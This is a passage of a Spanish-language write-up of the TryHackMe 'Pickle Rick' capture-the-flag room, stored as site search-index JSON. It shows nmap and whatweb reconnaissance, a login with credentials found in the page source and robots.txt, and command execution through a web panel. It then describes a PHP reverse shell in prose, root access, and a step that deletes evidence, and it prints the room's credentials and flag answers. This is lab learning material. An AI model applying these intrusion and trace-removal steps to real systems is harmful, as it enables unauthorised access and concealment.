$rick -oN scaner\n</code></pre> <p>Podemos observar que los puerto que tiene abiertos esta maquina son <code>22</code> y <code>80</code> los cuales son del servicio de ssh y de http.</p> <pre><code># Nmap 7.94SVN scan initiated Sun Jun  9 00:36:53 2024 as: nmap -p- -sV -sC --open -sS -vvv -Pn -oN scaner 10.10.110.194\nNmap scan report for 10.10.110.194\nHost is up, received user-set (0.19s latency).\nScanned at 2024-06-09 00:36:53 EDT for 71s\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE REASON         VERSION\n22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 c1:a5:25:35:19:7b:13:dc:f3:14:8a:65:20:e6:86:c7 (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDD9cthWxUOmRc7iynzgGizNCcI0yWxV6U31Z7HhYRswbXSM552SDJHqAICtBufn3WsIHA3WI2dQ/PgfbF4geVoDpzoB8YsHf7My8BXMZfsQb8koPyXrveEfgcplItQ8dR2RhEQODvXqoqpCV+gnRggRmvOTEiCoFMcEeXoV1X3cTxooe8jql4zVZxK6pjm+NSLB144lpJFEaVTsSutw/V6U3aWcVnvd5LpBSVHJnq2NBfSf2IGBYaNCz9CpnbiBcol3BQKOqdIylYrEqURyuM9Je/MEnYI6p+yI/vuckELrqO8Xo7qp6ZaWoMHcQATaUUJbrOQQUJ/oooU6HkQvpHmSY+CO/o/b2rPQ0s3QnYIziL/Bf0u+gsCCN43oWrgJQIxhGvxqc3gNJnXCTVvUQJcyXJNiPtk4tlBs83ARp9iUFgVyS7TjF+Dc6z7KX8vn+lQtoUO1HeyGxTAA0mvrjwONhsq9OOVQDEcQa07O2UNU4iPWAV+TQlX6LYLqoLsyVU=\n|   256 6b:7a:ca:75:c2:8a:5e:0e:0f:b6:5e:84:fc:9d:1b:48 (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBORS926I/HTcMA1cuq1G/ivExe4RRYqRYixKjrEYPrFsXIyL1YWsGrVxGyFAXkC3sru29foUUSpyRAoytqPBq2Q=\n|   256 49:e9:d3:55:98:94:d8:a5:32:e0:9e:cd:51:1b:d5:d3 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKnEhKcDqroTtK7gZp21c9kMSZHlwJstIBcUuTkCXkLO\n80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Rick is sup4r cool\n| http-methods: \n|_  Supported Methods: POST OPTIONS HEAD GET\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n</code></pre> <p>Realizamos un reconocimiento por el puerto 80 que es de http, ya que le servicio de ssh necesitamos credenciales y no las tenemos para poder acceder a la maquina. Al ingresar al servicio de http de la maquina obtenemos una pantalla de de inicio de la serie de Rick and Morty.</p> <p></p> <p>Al realizar un <code>whatweb</code> sobre la pagina, miramos algunas herramientas que son utilizadas para el funcionamiento de la pagina.</p> <pre><code>whatweb http://10.10.110.194/\n</code></pre> <p>Se puede observar que esta corriendo por un servicio de <code>Apache 2.4.41</code> en un servidor de <code>Ubuntu Linux</code> y utilizando algunas herramientas de desarrollo de paginas web.</p> <pre><code>http://10.10.110.194/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.110.194], JQuery, Script, Title[Rick is sup4r cool]\n</code></pre> <p>Al realizar una inspecci\u00f3n de c\u00f3digo fuente de la pagina encontramos algo muy interesante que es un posible usuario, que lo podremos utilizar posteriormente en algunos an\u00e1lisis.</p> <p></p> <p>Tambi\u00e9n exploramos alg\u00fan reconocimiento de rutas con los cuales podremos encontrar mas informaci\u00f3n, sobre algunas rutas que pueden estar expuestas en dentro de la pagina web.</p> <pre><code>nmap --script http-enum -p80 10.10.110.194 -oN webscan\n</code></pre> <p>Con el escaneo se logra obtener dos rutas que parecen interesante <code>/login.php</code> y <code>/robots.txt</code>, las cuales est\u00e1n disponibles para ser accedidas desde el navegador.</p> <pre><code># Nmap 7.94SVN scan initiated Sun Jun  9 00:46:16 2024 as: nmap --script http-enum -p80 -oN webscan 10.10.110.194\nNmap scan report for 10.10.110.194\nHost is up (0.19s latency).\n\nPORT   STATE SERVICE\n80/tcp open  http\n| http-enum: \n|   /login.php: Possible admin folder\n|_  /robots.txt: Robots file\n</code></pre> <p>Al ingresar a la ruta de <code>robots.txt</code> encontramos lo siguiente, tiene una forma rara de escritura, pero es lo \u00fanico que se encuentra en esta ruta, con lo cual es algo inusual, la vamos a guardar para ver si se la puede utilizar en pasos posteriores.</p> <p></p> <p>Al ingresar a la ruta de <code>/login.php</code>, encontramos un panel de ingreso de credenciales, lo cuales podemos intuir algunas cosas que ven\u00edamos encontrando en pasos anteriores, para ingresar a este panel de login, vamos a ingresar con el usuario encontrando y con la cadena de caracteres extra\u00f1a como contrase\u00f1a, para ver si tenemos \u00e9xito de ingreso.</p> <p></p> <p>Para probar la credenciales procedemos a ingresar y intentar obtener acceso con la informaci\u00f3n encontrada.</p> <pre><code>user: R1ckRul3s\npassword:Wubbalubbadubdub\n</code></pre> <p>Al ingresar esas credenciales, se logro ingresar a un panel de administraci\u00f3n donde podemos administrar varias cosas, pero algo que llama mucho a atenci\u00f3n es el primer panel, que dice <code>commands</code> donde posiblemente podemos ejecutar comando sobre alg\u00fan servicio, como observamos anteriormente esta pagina web, esta corriendo sobre un servidor de Ubuntu, donde los posibles comandos a ejecutar pueden ser los de Linux.</p> <p></p> <p>Al ingresar un posible comando de Linux para reconocer el usuario que esta corriendo observamos que tiene el usuario <code>www-data</code>, que es un usuario com\u00fan para los servicios de Apache, donde podemos intuir que este panel esta corriendo los mandos con este usuario sobre los directorios donde se encuentra alojada la pagina.</p> <p></p> <p>Probamos con otro comando de Linux para identificar si encontramos mas informaci\u00f3n y encontramos algo un archivo txt, que puede tener informaci\u00f3n de la maquina y de del reto que estamos investigando. </p> <p></p> <p>Y miramos su contenido del archivo <code>txt</code> y encontramos que es el primer ingrediente, para ingresar al campo de la flag encontrada.</p> <p></p> <p>Tambi\u00e9n podemos observar los privilegios que puede tener este usuario sobre el sistema, y se observa que tiene todos los privilegios para poder ejecutar comando como administrador, esto puede facilitar los accesos cuando logremos obtener control sobre la maquina.</p> <p></p> <p>Y se puede observar que tiene derecho a ejecutar todos lodos los comandos este usuario, con lo cual podemos darnos permisos para poder crear y ejecutar archivos para darnos acceso a la maquina.</p> <pre><code>sudo chown www-data:www-data /var/www/html\n</code></pre> <p></p> <p>Ya tenemos permisos para leer y ejecutar en esta maquina con este usuario <code>www-data</code>.</p> <p></p>"},{"location":"writeups/tryhackme/pickle-rick/#explotacion","title":"Explotaci\u00f3n","text":"<p>Una vez confirmada la posibilidad de ingresar comandos en el sistema, estamos en posici\u00f3n de explotar esta vulnerabilidad utilizando un exploit adecuado que nos permita obtener acceso remoto al sistema. Con los permisos obtenidos, subiremos un archivo malicioso dise\u00f1ado para establecer una conexi\u00f3n de <code>reverse shell</code>, lo que nos permitir\u00e1 conectarnos al sistema comprometido desde nuestro equipo atacante.</p> <p></p> <p>Luego de ejecutar el archivo maliciosa desde la maquina victima obtenemos acceso a la maquina desde la terminal del sistema.</p> <p></p> <p>Ingresado realizamos un tratamiento a la terminal y buscamos el segundo ingrediente en las carpetas que tenemos disponibilidad de acceso, el cual encontramos en el directorio de <code>/home/rick</code> y encontramos un archivo que tiene nuestro segundo ingrediente.</p> <pre><code>1 jerry tear\n</code></pre> <p>Ingresamos como usuario <code>root</code>, ya que tenemos los privilegios de super usuario, y buscamos el tercer ingrediente como <code>root</code>.</p> <p></p> <p>Y lo encontramos en el directorio ra\u00edz <code>/root</code>.</p> <p></p> <pre><code>3rd ingredients: fleeb juice\n</code></pre>"},{"location":"writeups/tryhackme/pickle-rick/#eliminacion-de-evidencia","title":"Eliminaci\u00f3n de evidencia","text":"<p>Al finalizar el proceso, dentro de la maquina procedemos a borrar el exploit creado para poder eliminar rastros dentro de la maquina.</p> <p></p>"},{"location":"writeups/tryhackme/pickle-rick/#finalizacion-del-reto","title":"Finalizaci\u00f3n del reto","text":""},{"location":"writeups/tryhackme/pickle-rick/#reflexion","title":"Reflexi\u00f3n","text":"<ol> <li>Al finalizar este reto de CTF, aprend\u00ed a enumerar de manera mas eficientes los diferentes puertos utilizando la herramienta <code>nmap</code>, para poder comprobar los servicios que tenia abiertos esta maquina.</li> <li>Aprend\u00ed a usar un <code>exploit</code> de PHP para poder escalar privilegios dentro de la maquina.</li> <li>Aprend\u00ed a seguir una ruta de explotaci\u00f3n para poder encontrar diferentes vulnerabilidades que pueden tener algunas maquinas, esto puede pasar en la vida real y lo f\u00e1cil que pueden ser vulnerables. </li> </ol>"}]}